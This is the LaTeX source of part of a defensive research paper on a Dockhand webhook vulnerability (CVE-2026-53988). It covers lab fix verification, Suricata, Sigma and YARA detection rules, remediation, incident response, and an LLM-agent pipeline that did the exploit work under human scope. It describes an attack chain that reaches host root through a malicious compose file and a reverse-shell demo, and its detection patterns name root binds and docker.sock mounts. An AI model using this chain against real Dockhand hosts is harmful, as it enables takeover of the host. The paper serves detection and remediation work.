Fig.~\ref{fig:stills} carries the film artifacts for the two payoff beats.
The defacement is described as what it is: a host-side demonstration, not a
panel feature. A reverse-shell session with \texttt{uid=0} on the simulated
host was exercised as the film's \texttt{reverse\_shell} beat (payload
\texttt{node:20-alpine}, preloaded as a documented lab precondition per
Section~\ref{sec:ethics}); the paper's machine-checkable proof remains the
canary files of Listing~\ref{lst:canaries}.

\subsection{What the compound does \emph{not} require}

No credential of any kind, no cookie, no secret value, no crafted signature,
no crafted git object (the panel clones what the branch points at), no open
non-standard port (web port 3000 is the product), and no user interaction.
Under CVSS 3.1 that is \texttt{AV:N/AC:L/PR:N/UI:N}; the \texttt{S:C} and the
High/High/High impact sub-comments are what our Tier-2 evidence demonstrates
on the simulated host.

% =============================================================================
\section{Fix Verification}
\label{sec:fix}

Patching claims need an A/B, and a negative result needs a live chain to make
it non-vacuous. The harness (\texttt{exploit/}\allowbreak\texttt{phase05-ab-fixverify.sh};
run \texttt{fixverify-20260930-201238}) is built around that discipline: each
arm owns its simulated host, every push is one shared commit consumed by both
arms, and no ``blocked'' verdict may be recorded before the fixed arm is shown
alive and functional.

\begin{table}[t]
\centering
\footnotesize
\setlength{\tabcolsep}{3pt}
\begin{tabular}{@{}p{4.05cm}p{3.65cm}@{}}
\toprule
Step (identical objects at both arms) & Result \\
\midrule
{[1]} health: benign HEAD, unsigned POST &
VULN: \texttt{200}, container \texttt{edge-cache} created on host 1;
FIXED: \texttt{401} \texttt{Invalid} \texttt{webhook} \texttt{signature} \\
\addlinespace[2pt]
{[2]} unsigned POST again, HEAD unchanged &
VULN: \texttt{200} \texttt{"skipped":true} (first-sync consumed; sync ran) \\
\addlinespace[2pt]
{[3]} attacker push (S-C): host-root compose &
VULN: \texttt{200}, recreate; host 1 \texttt{/tier2-canary} contains
\texttt{uid=0(root)} + \texttt{evil-landed} \\
\addlinespace[2pt]
{[4]} same evil commit at FIXED &
\texttt{401} + body \texttt{Invalid webhook signature}; host 2 filesystem
verified to \emph{not} contain the canary \\
\addlinespace[2pt]
{[5]} signed control at FIXED (\texttt{X-Hub-}\allowbreak\texttt{Signature-256}
HMAC of body, correct secret) &
\texttt{200}, \texttt{success:true}; \texttt{inspect} shows container
(started \texttt{2026-10-01T01:}\allowbreak\texttt{14:02Z}) on host 2:
endpoint and deploy path proven functional \\
\addlinespace[2pt]
{[6]} create stack, \texttt{webhookEnabled} + null secret at FIXED &
\texttt{400} \texttt{A webhook secret is} \texttt{required when the webhook}
\texttt{is enabled} \\
\bottomrule
\end{tabular}
\caption{A/B fix verification, non-vacuous by construction. The same commits
were consumed by both arms; step 5 precedes no verdict, it \emph{enables}
step 4's verdict. Transcript: \texttt{evidence/fixverify-}\allowbreak\texttt{20260930-201238/}.}
\label{tab:fixverify}
\end{table}

Table~\ref{tab:fixverify} walks the six steps. Three points deserve prose.
\textbf{First}, step 5 is the whole point of the design: the fixed arm's 401
could be explained by a dead endpoint, a downed daemon, or a misprovisioned
stack; the signed control, using only documented v1.0.40 semantics (HMAC
\texttt{sha256=}\texttt{\{hex\}} of the raw body keyed by the configured
secret, verified by our reading of the fix diff's shared
\texttt{verifyWebhookSignature()}), lands a real container on host 2 with a
recorded \texttt{StartedAt}. The 401 against the identical evil commit is
therefore a block, not an absence.
\textbf{Second}, host 2 was verified \emph{clean} after the attack step: the
attacker objects exist on the shared branch and were visible to the fixed
arm's repository, yet nothing landed; a parallel benign container named
\texttt{edge-cache} ran on each sim host to prove the daemons were live
(\texttt{health.txt}: \texttt{host1 edge-cache ok}).
\textbf{Third}, step 6 corroborates the source-diff reading at runtime: the
fixed product refuses to be configured into the vulnerable posture through
its own API, which is also why lab condition S-D exists.

\textbf{Limitations of the A/B.} Both arms are vendor images, but the
fixed arm is v1.0.40 specifically: later hardening in newer releases is not
represented. The A/B isolates the webhook authentication change and the
create-time refusal; it does not exercise the \texttt{git-url-safety.ts}
validators (the lab's \texttt{git://} URL and \texttt{main} ref pass them
legitimately, and we did not fabricate adversarial URLs to probe them, since
that path is not this CVE's flaw). And the managed hosts are dind
simulations, per Section~\ref{sec:ethics}.

% =============================================================================
\section{Detection Package}
\label{sec:detection}

The package under \texttt{detection/rules/} covers four layers:
wire (Suricata), panel stdout (Sigma), managed-host process/daemon shape
(Sigma), and artifacts (YARA), plus a self-test detector and an IOC set. Every
rule was fired, or held silent as a negative control, against our own recorded
attack (Suricata 8.0.6, YARA 4.5.8, \texttt{sigma-cli}); the live-fire table is
\texttt{evidence/}\allowbreak\texttt{rule-fires/}\allowbreak\texttt{sigma-fires.md}
and Table~\ref{tab:rules} summarizes it. No untested rule ships.

\begin{table*}[t]
\centering
\footnotesize
\begin{tabular}{@{}p{4.3cm}p{1.5cm}p{9.0cm}@{}}
\toprule
Rule (file) & Layer & Live-fire result \\
\midrule
\texttt{suricata 2026539880} setter & wire & 0 alerts on signed replay
(\texttt{negative-control-signed-}\allowbreak\texttt{post.txt}), correct
silence; sets \texttt{flowbits} \\
\texttt{suricata 2026539881} attempt & wire & fired on both arms (unsigned
POST to \texttt{172.30.53.21} and \texttt{172.30.53.31}): fires on patched
builds too, by design \\
\texttt{suricata 2026539882} execution & wire & fired only on the vulnerable
arm (\texttt{200} + \texttt{success} to an unsigned request) \\
\texttt{suricata 2026539883} defense & wire & fired only on the fixed arm
(\texttt{401} to an unsigned request) \\
\texttt{sigma dockhand\_deploy\_}\allowbreak\texttt{executed} & log & matched
real panel stdout captured from anonymous-trigger deploys
(\texttt{sigma/}\allowbreak\texttt{sink-stdout-capture.txt});
\texttt{sigma-cli} check: 0 errors \\
\texttt{sigma dockhand\_compose\_}\allowbreak\texttt{child\_process} & process
& shape proven via managed-daemon events (container create 0.5\,s after POST)
instead of auditd, stated in the rule: lab has no auditd \\
\texttt{yara Dockhand\_Compose\_}\allowbreak\texttt{HostRootCompound} &
artifact & matched the real pwned compose (\texttt{sha256 3c67aef5}\ldots),
silent on the stock seed compose (\texttt{b35cfde2}\ldots) \\
\texttt{detect\_dockhand.py --audit} & self-test & \texttt{UNDETERMINED-}
\texttt{PASSIVE} on both arms, with explanation (Section~\ref{sec:fingerprint})
\\
\texttt{detect\_dockhand.py --active} & self-test & \texttt{SINK EXECUTES} on
v1.0.39 (verifier confirmed container on managed host), \texttt{PATCHED} on
v1.0.40 (\texttt{401}, no side effect) \\
\bottomrule
\end{tabular}
\caption{Detection package summary; each row's raw capture sits under
\texttt{evidence/rule-fires/} next to the file named.}
\label{tab:rules}
\end{table*}

\subsection{Wire: four Suricata signatures with flowbit doctrine}

The set separates \emph{attempt} from \emph{execution} from \emph{defense}, so
the attempt rule fires on patched builds too (the attacker does not know your
patch state) and the response-side rules tell you which happened. A silent
setter rule records the presence of a valid-looking signature header so the
attempt rule's negated content does not have to stand alone. Listing~\ref{lst:suricata}
is the attempt rule.

\begin{minipage}{\dimexpr\columnwidth-10pt}
\begin{lstlisting}[style=shell,label={lst:suricata},
caption={Attempt signature (sid 2026539881 rev 7, abridged message): raw
payload form, see the decoder note below}]
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
  msg:"CVE-2026-53988 Dockhand git webhook POST \
       without signature header"; \
  flow:established,to_server; \
  content:"POST /api/git/"; \
  content:"webhook"; \
  content:!"X-Hub-Signature-256"; \
  flowbits:set,cve202653988.unsigned; \
  reference:cve,CVE-2026-53988; \
  reference:url,github.com/Finsys/dockhand/ \
            releases/tag/v1.0.40; \
  classtype:attempted-admin; sid:2026539881; rev:7;)
\end{lstlisting}
\end{minipage}

Live fire (attack pcap replayed through Suricata 8.0.6, capture on the lab
veth): four alerts in one run, two attempts (both arms), the 200-execution
alert on the vulnerable flow only, and the 401-defense alert on the fixed flow
only (\texttt{suricata/attack-fire.txt}); the fully signed legitimate replay
produces zero alerts. \textbf{Engine pitfall we verified:} on this capture the
HTTP decoder degraded (EVE logged url only, no method or status),
\texttt{http.uri}/\texttt{http.stat\_code} keyword rules did not fire, and
\texttt{http.header} refuses a lone negated content (``setup buffer
http\_header but didn't add matches to it''). The rules therefore ship in raw
payload form with explicit \texttt{flow:} direction, exact for this small
single-packet POST; the \texttt{http.*} variants are documented in the rule
file as decoder-dependent. Defenders on healthy HTTP decoding may prefer the
keyword form; ours is the form that was proven on hostile-to-tooling capture.

\subsection{Logs and processes: two Sigma rules}

\texttt{dockhand\_deploy\_executed.yml} matches the panel stdout block
(\texttt{DEPLOY GIT STACK START}, \texttt{SYNC GIT STACK COMPLETE} with
\texttt{Success: true}). Its description states the condition plainly: on the free edition these lines carry \emph{no actor
context}, so the rule marks that the sink ran and must be correlated with the
wire attempt rule (sid 2026539881) to separate attacker triggers from
legitimate CI. \texttt{dockhand\_compose\_}\allowbreak\texttt{child\_process.yml}
describes the managed-host shape for auditd/eDR: \texttt{docker} CLI with
\texttt{compose} \texttt{up} as a child of the panel runtime, within 30\,s.
The lab has no auditd, so the rule's shape was proven through the managed
daemon's own event record (container created 0.5\,s after the anonymous POST,
Section~\ref{sec:tier1}) and the rule text says exactly that rather than
claiming an auditd demo. \texttt{sigma-cli} validation: 0 errors, 0 condition
errors, 0 issues.

\textbf{The free-edition audit blind spot (finding).} The panel's native
\texttt{audit\_logs} table is Enterprise-gated; on the free v1.0.39 instance
we attacked, it was \textbf{empty} through the entire compound. This changes
the defender's answer to ``the panel will show who did it:'' on the free tier
it will not. stdout shipping to a log collector, the wire, and daemon events
are the layers that exist.

\subsection{Artifacts: one YARA rule}
\label{sec:yara}

Scanned against real artifacts (YARA 4.5.8): it matches the pushed
\texttt{malicious-compose.yaml} (\texttt{sha256}\allowbreak\texttt{3c67aef5f0251691}\ldots)
and stays silent on the stock benign compose
(\texttt{sha256}\allowbreak\texttt{b35cfde28faa202c}\ldots); the hashes are
recorded with the run (\texttt{rule-fires/yara/}). The shape generalizes: any
compose bind-mounting the managed host's root or socket, from any source, is
worth an alert on a panel that deploys from git. The socket-only shapes were
deliberated and rejected as primary strings: \texttt{docker.sock} mounts are a
legitimate and common pattern for management stacks, so a socket-only rule
drowns in benign noise on any fleet that runs monitoring agents; the root bind
carried by this compound is the pattern an attacker reaches for when the goal
is the host itself, and the conjunctive socket-plus-privileged arm keeps the
alternative shape covered without standalone false positives. Hash pinning was
considered and rejected too: the attacker controls the repo, so content hashes
rotate with every push while the \emph{structure} that matters, host-path
reachability, persists.

\begin{lstlisting}[style=yar,label={lst:yara},
caption={\texttt{detection/rules/}\allowbreak\texttt{yara/}\allowbreak\texttt{dockhand\_}\allowbreak\texttt{compose\_takeover.yar}
(meta text abridged): matches the compound's artifact shape, validated against
the real pwned compose and the stock seed}]
rule Dockhand_Compose_HostRootCompound
{
  meta:
    description = "Compose artifact of the CVE-2026-53988 compound:"
      " a git-stack compose bind-mounting host root (/:/hostroot),"
      " socket+privileged variant as alternative shape"
    reference = "CVE-2026-53988"
    validation = "matches the real pwned compose; NOT the stock seed"
  strings:
    $rootbind = "- /:/" ascii
    $sock1 = "/var/run/docker.sock" ascii
    $priv = "privileged: true" ascii nocase
  condition:
    filesize < 8192 and ( $rootbind or ($sock1 and $priv) )
}
\end{lstlisting}

\subsection{Fingerprinting is impossible; active testing is the only sound probe}
\label{sec:fingerprint}

The natural defender question, ``can I just probe the panel to learn if it is
patched?'' has a negative answer our runs force. The signature enforcement in
v1.0.40 was inserted \emph{inside} the handler flow, after the stack lookup,
so both builds answer an unknown id the same way: \texttt{404}
\texttt{\{"error":"Git stack not found"\}} (both arms, captured side by side
in \texttt{canary/audit-}\allowbreak\texttt{vulnerable.txt} and
\texttt{canary/audit-fixed.txt}). \texttt{detect\_dockhand.py --audit}
therefore returns \texttt{UNDETERMINED-PASSIVE} on both arms and tells you so,
instead of selling a version guess. Separation needs \texttt{--active}: one
anonymous POST at a \emph{real} stack id you own. Fixed builds answer
\texttt{401} with no side effect; vulnerable builds reach the deploy path and
your own verifier command (supplied by the defender, run against your managed
daemon) observes the effect
(\texttt{active-vulnerable.txt}: \texttt{VERDICT: SINK EXECUTES}, response
200 in 0.4\,s, container re-created; \texttt{active-fixed.txt}:
\texttt{VERDICT: PATCHED}). The detector also prints the live-negative
caveat: a \texttt{skipped:true} or \texttt{403} answer does not prove safety
(no pending commit, webhook disabled, daemon unreachable all produce it).
The IOC file carries the same discipline: every pattern in it traces to an
evidence file.

\textbf{EDR mapping (documented, not demoed):} the lab has no commercial EDR,
so we state the difference plainly here: CrowdStrike (\texttt{ParentBaseFileName}
\texttt{in (bun,node)}, \texttt{BaseFileName=docker}, command line containing
\texttt{compose} and \texttt{up}) and SentinelOne (same shape via
\texttt{Event/ProcessStart}) queries are written in
\texttt{evidence/rule-fires/}\allowbreak\texttt{sigma-fires.md} and labeled
as mappings, not as fired detections.

% =============================================================================
\section{Remediation and Incident Response}
\label{sec:remediation}

\textbf{Primary fix: upgrade to v1.0.40 or later} (available since
2026-07-31)~\cite{vendorfix}, which makes the secret mandatory at the handler
(401 on null), at the API (400 on create/update with a null secret), and
hardens git argument handling on top. Our A/B (Table~\ref{tab:fixverify})
confirms the identical attacker objects are rejected while the product still
deploys correctly when used as documented.

\textbf{If the upgrade cannot land today}, in preference order. (1) Enumerate
exposure with the product's own data: every stack with \texttt{webhookEnabled}
\texttt{=true} and an empty/NULL secret is an unauthenticated deploy trigger
right now; query the panel API or the \texttt{git\_stacks} table (columns
\texttt{webhook\_enabled}, \texttt{webhook\_secret}). (2) For each, either set
a strong secret and rotate it, or disable the webhook and use authenticated
deploys; remember \texttt{forceRedeploy} amplifies every trigger. (3) Put the
panel behind a reverse proxy that requires a secret header or source allowlist
for \texttt{/api/git/}\texttt{*webhook} paths, and stop exposing the panel on
untrusted networks (the same socket-mount logic that makes this CVE a 10.0
makes any panel exposure dangerous). (4) Treat the tracked branches of
panel-consumed repositories as production credentials: signed commits,
protected branches, review on compose changes; the Tier-2 compound dies at the
branch-write step. (5) Deploy the wire and log rules from
Section~\ref{sec:detection} now; the attempt signature catches attackers
whether or not you are patched. Full detail: \texttt{remediation.md} in the
case folder.

\textbf{Incident response.} The playbook (\texttt{playbook-ir.md}) is
structured as: (Phase 0, read-only triage) grep panel stdout over the
retention window for \texttt{DEPLOY GIT STACK START} blocks and reconcile each
against known CI; replay the wire rules over the last weeks of pcap if kept;
on the managed host look for stack containers with unexpected binds
(\texttt{docker inspect} for \texttt{/:/}, socket mounts,
\texttt{privileged}) and for files like \texttt{/tier2-canary}-class markers;
check whether \texttt{audit\_logs} is even populated on your edition.
(Phase 1, containment) disable the exposed webhooks, revoke branch write,
isolate the managed host's network, preserve daemon journal, panel logs, and a
hashed tarball before touching anything. (Phase 2, eradication) rebuild any
host where attacker compose ran: a root container with \texttt{/:/} is a host
compromise, treat persistence accordingly; restore the tracked branch from
known-good commits. (Phase 3, recovery) upgrade, re-run
\texttt{detect\_dockhand.py --audit} and \texttt{--active}
with your own verifier, keep
the detection package deployed, and re-check after 30 days.

\textbf{The defender's recurring question}, ``am I already hit,'' is answered
by the same artifacts: the YARA rule over any synced
\texttt{/app/data/}\allowbreak\texttt{stacks/} copies and git repo working
trees, the wire rules over retained pcaps, and the daemon-side bind audit.
Caveats: without pcap or stdout retention, pre-auth triggers from weeks
ago may simply be unresolvable, which is itself an argument for the logging
recommendations.

% =============================================================================
\section{Ethics, Limitations, Reproducibility, and the Agent Pipeline}
\label{sec:ethics}

\textbf{No discovery claim.} CVE-2026-53988 is a publicly disclosed
vulnerability: the vendor fix shipped 2026-07-31 in v1.0.40, and the VulnCheck
advisory and GHSA-h855-x6jx-cfw2 were published 2026-09-29, credited finder
Katriel Moses, coordinator VulnCheck~\cite{cverecord,vulncheck,ghsa}. This
paper makes no discovery claim. Its contribution is evidence and tooling: the
tiered chain, the trigger semantics, the free-edition audit finding, the
fingerprint impossibility, the A/B, and the fired detections, all of which the
public record left out (Section~\ref{sec:intro}).

\textbf{Scope and safety.} Every packet in this paper crossed exactly one
network: the \texttt{--internal} Docker network of Section~\ref{sec:lab},
against fictional \texttt{*.lab} hosts and vendor-supplied images we pulled
once; no third-party system was touched, and no vulnerability was tested
against any real deployment. Payloads followed minimum-impact discipline:
Tier 1's only effect is the legitimate deploy of a benign container, Tier 2's
attacker payload writes two small canary files and copies the lab flag to a
second lab file, the defacement is a lab-page banner served by the lab's own
simulated host, and no persistence, destruction, or lateral movement beyond
the simulated host was attempted. Nine evidence folders include failed runs
rather than being pruned to survivors.

\textbf{Limitations, stated in full.} (i) The managed hosts are
\texttt{docker:28-dind} containers simulating a Docker host (the vendor's
socket mount reproduced on an internal network); \texttt{uid=0} there is
demonstrated host root against a simulated host, not against a hardened
production machine, and this paper deliberately calls it ``managed host''
throughout with this note attached. (ii) The tracked repository is served by
\texttt{git://} with anonymous push (condition S-C), a lab modeling device for
the advisory's branch-write prerequisite; real attackers earn that step the
slow way (stolen tokens, insiders, open forks). (iii) The \texttt{alpine}
stack image is preloaded into the sim hosts so deploys need no egress; the
film's reverse-shell payload (\texttt{node:20-alpine}) is likewise a preseeded
lab precondition. (iv) The fixed arm cannot be configured into the vulnerable
posture (condition S-D is forced by the fix), so the A/B compares posture
pairs, not one posture twice; the signed control closes that gap as far as it
can be closed. (v) First-sync semantics mean our executing Tier-1 trigger
covers the fresh-stack and post-push windows precisely, not every instant;
\texttt{forceRedeploy} closes that gap only where an admin sets it.
(vi) Sigma process-rule shapes are validated via daemon-side evidence because
the lab carries no auditd; the rules say so. (vii) The EDR mappings are
documented, not executed (no EDR in lab).

\textbf{Reproducibility.} The companion case folder \texttt{Research/}\allowbreak\texttt{CVE-2026-53988/}
is self-contained: \texttt{lab/} rebuilds the topology (\texttt{lab-compose.yaml},
\texttt{provision.sh}, \texttt{verify.sh} as precondition gate);
\texttt{exploit/} holds the three drivers quoted throughout;
\texttt{detection/rules/} imports into Suricata, Sigma-compatible SIEMs, and YARA 4.x;
\texttt{detection/detect\_dockhand.py} is stdlib-only Python;
\texttt{ioc/} carries the pattern set; \texttt{evidence/} holds every
transcript cited by section above; \texttt{videos/} holds the take drivers
whose film stills are requested in \texttt{paper/}\allowbreak\texttt{STILLS-REQUEST.md}.
A defender can clone, run \texttt{verify.sh}, and go from zero to ``the rules
fire on my own reproduction'' inside an hour on any Docker host, without
egress.

\textbf{Agent pipeline.} This case was produced by the
\texttt{cve-full-lifecycle} autonomous pipeline (design, lab build, exploit,
fix verification, detection, film rig, paper), an LLM-agent pipeline with the
think-then-act barrier, evidence folders, and gate scripts that prior cases in
this series established~\cite{zimbraPaper}; a human set scope, approved the
kill-shot tiers, and verified the on-camera claims frame by frame. We report
it as the same n-of-one case-study caveat as before: it shows the pipeline
completing a second real-CVE lifecycle with a non-vacuous A/B, not a
capability claim in general. The audit trail of that pipeline is the attempt log in Section~\ref{sec:lab} and the failed-run evidence it kept.

% =============================================================================
\section{Conclusion}
\label{sec:conclusion}

CVE-2026-53988 is a missing-authentication flaw whose blast radius is defined
by what sits behind the unauthenticated action: a git clone of a branch
someone might be able to write, and a Docker socket that is the managed host.
The public record said as much in two paragraphs; this paper turned those
paragraphs into measured, reproducible fact on the real vendor images: Tier 1,
an anonymous POST creating a container on the managed host within a second of
the request, with first-sync and \texttt{forceRedeploy} semantics made
explicit; Tier 2, the documented branch-write prerequisite landing attacker
compose that runs as root and loots the host's flag, verified by root-owned
canaries on the (simulated, stated) host; a fix verification in which the
patched arm rejects the identical objects and is proven functional by a signed
control before it is trusted to be blocking; and a detection package in which
every rule fired against the attack it describes, alongside two findings
defenders need to hear: the free edition's audit trail is empty when it
matters, and this flaw cannot be fingerprinted passively, only tested against a stack id you own. The remediation is one upgrade, one secret per webhook, and one
look at your branch permissions, none of which requires our evidence, and all
of which our evidence makes urgent.

% =============================================================================
\begin{thebibliography}{99}

\bibitem{cverecord}
MITRE CVE Program / VulnCheck (CNA), ``CVE-2026-53988: Dockhand before 1.0.40
Unauthenticated Webhook Trigger via Git Webhook Endpoints'' (CWE-306; CVSS 4.0
9.2, CVSS 3.1 10.0; credit Katriel Moses, coordinator VulnCheck),
\url{https://www.cve.org/CVERecord?id=CVE-2026-53988}.

\bibitem{vulncheck}
VulnCheck, ``Dockhand: Unauthenticated Webhook Trigger via Git Webhook
Endpoints'' (advisory, 2026-09-29),
\url{https://www.vulncheck.com/advisories/dockhand-unauthenticated-webhook-trigger-via-git-webhook-endpoints}.

\bibitem{ghsa}
GitHub, ``GHSA-h855-x6jx-cfw2: Dockhand Unauthenticated Webhook Trigger''
(published 2026-09-29),
\href{https://github.com/Finsys/dockhand/security/advisories/GHSA-h855-x6jx-cfw2}{\texttt{github.com/Finsys/}\hspace{0pt}\texttt{dockhand/security/}\hspace{0pt}\texttt{advisories/GHSA-}\hspace{0pt}\texttt{h855-x6jx-cfw2}}.

\bibitem{vendorfix}
Finsys, ``Dockhand v1.0.40 release notes'' (tagged 2026-07-31; git stack
webhooks require a configured secret; git URL/ref safety),
\url{https://github.com/Finsys/dockhand/releases/tag/v1.0.40}.

\bibitem{vendorrepo}
Finsys, ``dockhand'' (source repository, analyzed at tags v1.0.39 and
v1.0.40: \texttt{src/hooks.}\allowbreak\texttt{server.ts},
\texttt{src/routes/api/}\allowbreak\texttt{git/stacks/[id]/}\allowbreak\texttt{webhook/}\allowbreak\texttt{+server.ts},
\texttt{src/lib/server/}\allowbreak\texttt{git-url-}\allowbreak\texttt{safety.ts},
\texttt{src/lib/server/}\allowbreak\texttt{webhook-signature.ts}),
\url{https://github.com/Finsys/dockhand}.

\bibitem{cwe306}
MITRE, ``CWE-306: Missing Authentication for Critical Function,''
\url{https://cwe.mitre.org/data/definitions/306.html}.

\bibitem{owaspa01}
OWASP, ``Top 10 2021 A01: Broken Access Control,''
\url{https://owasp.org/Top10/A01_2021-Broken_Access_Control/}.

\bibitem{docker}
Docker Inc., ``Docker Engine: securing the daemon and socket; Compose file
reference (volumes, bind mounts),''
\url{https://docs.docker.com/engine/}.

\bibitem{sigma}
SigmaHQ, ``Sigma: generic signature framework for SIEM event logs,''
\url{https://github.com/SigmaHQ/sigma}.

\bibitem{yara}
VirusTotal, ``YARA: the pattern matching swiss army knife,''
\url{https://github.com/VirusTotal/yara}.

\bibitem{suricata}
Open Information Security Foundation, ``Suricata: network security monitoring
engine, IPS, and IDS,'' \url{https://suricata.io/}.

\bibitem{zimbraPaper}
M. Zabala, ``CVE-2026-73570: Full Lifecycle Evidence, Defender Detections, and
Remediation for Zimbra's SNMP-Sink Command Injection,'' Xpectra Security
Research technical paper, 2026 (companion case in the same autonomous
lifecycle pipeline).

\end{thebibliography}

\end{document}
